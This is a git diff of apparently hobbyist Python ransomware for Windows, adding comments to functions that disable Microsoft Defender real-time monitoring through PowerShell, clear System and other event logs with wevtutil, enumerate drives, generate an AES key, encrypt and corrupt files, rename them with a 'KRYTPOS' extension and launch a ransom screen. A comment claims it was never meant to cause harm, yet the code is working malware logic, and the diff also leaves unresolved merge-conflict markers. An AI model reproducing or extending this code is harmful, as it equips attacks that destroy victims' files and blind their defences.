@@ -11,6 +11,7 @@ import sys
 import winreg
 import win32api
 
+# This ransomware was NEVER designed to cause harm, a kill switch similar to wannacry is implemented
 def initial_check_kill():
     connect_counter = 0
     
@@ -33,17 +34,20 @@ def initial_check_kill():
         except requests.ConnectionError:
             connect_counter += 1
 
+# Malware gets deleted from users file
 def kill_ransomware_file():
     ransomware_file = os.path.abspath(__file__)
     try:
         os.remove(ransomware_file)
     except:
         sys.exit()
-        
-def spread():
+
+# A simple spreading mechanisim, disabled by default
+def spread(spread=False):
     # To be implemented
     pass
 
+# Start up commands for CMD and Powershell to attempt to disable security services
 def startup_commands_windows():
     win_commands = [
         "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
@@ -69,6 +73,7 @@ def startup_commands_windows():
         if result.returncode != 0: 
             pass
 
+# Attempt to clear event logs after attack
 def attempt_rem_event_logs():
     win_commands = [
         "wevtutil cl System",
@@ -81,13 +86,29 @@ def attempt_rem_event_logs():
         if result.returncode != 0: 
             pass
 
+<<<<<<< HEAD
+=======
+# Gather all drives used inside system
+def gather_all_drives():
+    drives = win32api.GetLogicalDriveStrings()
+    drives = drives.split('\000')[:-1]
+    
+    if len(drives) == 0:
+        sys.exit()
+        
+    return drives
+
+# Launch ransom screen (as .exe format)
+>>>>>>> 84f892d23335a13804846f75a5001e0d895cf719
 def launch_gui():
     path = os.path.join(os.getcwd(), "Screen.exe")
     subprocess.Popen([path])
 
+# Generate temporary AES symetric key
 def generate_key():
     return get_random_bytes(32)
 
+# Encyrpt and corrupt file chosen
 def encrypt_file(file_path, key):
     try:
         with open(file_path, "rb") as file:
@@ -109,6 +130,7 @@ def encrypt_file(file_path, key):
     except OSError:
         pass
 
+# Rename file extension with KRYTPOS tag
 def rename_file_with_counter(file_path, new_extension):
     base = os.path.splitext(file_path)[0]
     new_filename = base + new_extension
